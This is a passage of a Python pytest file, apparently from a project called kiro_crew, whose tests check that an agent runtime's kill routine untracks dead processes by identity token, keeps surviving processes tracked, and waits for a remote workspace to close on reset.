            monkeypatch.setattr(pc, "close_process_handle", lambda h: None)
            monkeypatch.setattr(pid_mod, "_untrack_pid", lambda p: untrack("pid", p))
            monkeypatch.setattr(pid_mod, "_untrack_session_pid", lambda p: untrack("session", p))
        else:
            monkeypatch.setattr(rt_mod, "_untrack_pid", lambda p: untrack("pid", p))
            monkeypatch.setattr(rt_mod, "_untrack_session_pid", lambda p: untrack("session", p))
            monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
            monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)

        await rt.kill()

        assert calls["pid"] == [4242]
        assert calls["session"] == [4242]

    @pytest.mark.asyncio
    async def test_kill_retires_by_identity_when_a_spawn_token_is_held(self, monkeypatch):
        """The reap proved THIS process dead, not that its number is still ours:
        a root spawned since can already hold it. So the kill path retires the
        line that names this process (the token read at spawn), never the lines
        that merely carry the number."""
        rt, _, proc = _make_runtime()
        proc.wait = AsyncMock(return_value=0)
        rt._spawn_start_token = "tok-a"

        import kiro_crew.acp.runtime as rt_mod

        if rt_mod.platform_compat.IS_WINDOWS:
            pytest.skip("the Windows owned drain retires under its pin; covered separately")
        identity_calls: list[tuple[int, str]] = []

        def _by_identity(pid, token):
            identity_calls.append((pid, token))
            return True

        def _never(*_a):
            raise AssertionError("prefix-matched untrack ran although a token was held")

        monkeypatch.setattr(rt_mod, "_untrack_root_by_identity", _by_identity)
        monkeypatch.setattr(rt_mod, "_untrack_pid", _never)
        monkeypatch.setattr(rt_mod, "_untrack_session_pid", _never)
        monkeypatch.setattr(rt_mod, "_untrack_pid_if_dead", _never)
        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)

        await rt.kill()

        assert identity_calls == [(4242, "tok-a")]

    @pytest.mark.asyncio
    async def test_kill_clears_the_bare_line_only_while_dead_when_no_session_line_was_ours(
        self, monkeypatch
    ):
        """Identity retirement found no line of ours (spawn's append failed, or a
        successor already replaced it). The bare line still goes -- but through
        the probe-under-lock helper, never by number alone."""
        rt, _, proc = _make_runtime()
        proc.wait = AsyncMock(return_value=0)
        rt._spawn_start_token = "tok-a"

        import kiro_crew.acp.runtime as rt_mod

        if rt_mod.platform_compat.IS_WINDOWS:
            pytest.skip("the Windows owned drain retires under its pin; covered separately")
        if_dead_calls: list[int] = []

        def _never(*_a):
            raise AssertionError("prefix-matched untrack ran although a token was held")

        monkeypatch.setattr(rt_mod, "_untrack_root_by_identity", lambda pid, token: False)
        monkeypatch.setattr(rt_mod, "_untrack_pid_if_dead", lambda pid: if_dead_calls.append(pid))
        monkeypatch.setattr(rt_mod, "_untrack_pid", _never)
        monkeypatch.setattr(rt_mod, "_untrack_session_pid", _never)
        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)

        await rt.kill()

        assert if_dead_calls == [4242]

    @pytest.mark.asyncio
    async def test_kill_keeps_pid_tracked_when_the_process_survives(self, monkeypatch):
        """A survivor must STAY tracked so the orphan sweeps can still reach it.

        The counterpart to the test above, and the reason that one has to stub
        `pid_exists` rather than rely on the ambient process table: untracking a
        process that outlived SIGTERM/SIGKILL escalation would leak it until
        reboot, because the sweep would then have no handle on it.
        """
        rt, _, proc = _make_runtime()
        proc.wait = AsyncMock(return_value=0)

        calls: dict[str, list[int]] = {"pid": [], "session": []}
        import kiro_crew.acp.runtime as rt_mod

        monkeypatch.setattr(rt_mod, "_untrack_pid", lambda p: calls["pid"].append(p))
        monkeypatch.setattr(rt_mod, "_untrack_session_pid", lambda p: calls["session"].append(p))
        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: True)
        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)
        monkeypatch.setattr(
            rt_mod.platform_compat,
            "terminate_windows_asyncio_tree",
            AsyncMock(side_effect=OSError("fixture tree still alive")),
        )

        if rt_mod.platform_compat.IS_WINDOWS:
            with pytest.raises(OSError, match="fixture tree still alive"):
                await rt.kill()
            assert rt._process is proc
        else:
            await rt.kill()

        assert calls["pid"] == []
        assert calls["session"] == []


@pytest.mark.asyncio
@pytest.mark.parametrize("fails", [False, True])
async def test_a_kill_returns_only_after_its_remote_workspace_has_closed(monkeypatch, fails):
    """GPT 6.1 on 1d19219382: a reset must not return while the guest is still running
    an old command, so the kill awaits the workspace's close (its relay stops each
    guest worker and waits for it); a close that fails never fails the kill."""
    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    closed = asyncio.Event()

    async def close():
        await asyncio.sleep(0)
        closed.set()
        if fails:
            raise RuntimeError("guest unreachable")

    rt._remote_workspace = {"server": {"name": "workspace"}, "workdir": "/w", "close": close}
    await rt.kill(expected=True, reason="reset")
    assert closed.is_set()
